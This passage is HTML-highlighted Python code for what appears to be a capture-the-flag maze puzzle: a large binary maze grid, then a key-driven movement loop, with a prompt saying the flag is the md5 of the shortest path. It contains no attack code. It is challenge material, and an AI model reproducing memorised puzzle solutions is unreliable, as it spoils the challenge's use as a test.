punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Mice walk in a maze: wasd to move,q to quit'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag is the shortest path's md5,example:if the shortest path is wasdsdw,the flag is md5('wasdsdw')"</span><span class="token punctuation">)</span>  i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  n <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> i <span class="token operator">==</span> row <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> j <span class="token operator">==</span> col <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ohhhh!!!!you did it'</span><span class="token punctuation">)</span>              <span class="token keyword">break</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your position:(&#123;&#125;,&#123;&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>          inp <span class="token operator">=</span> msvcrt<span class="token punctuation">.</span>getch<span class="token punctuation">(</span><span class="token punctuation">)</span>          n <span class="token operator">+=</span> <span class="token number">1</span>          ti<span class="token punctuation">,</span> tj <span class="token operator">=</span> i<span class="token punctuation">,</span> j          <span class="token keyword">if</span> <span class="token string">b'a'</span> <span class="token operator">==</span> inp <span class="token 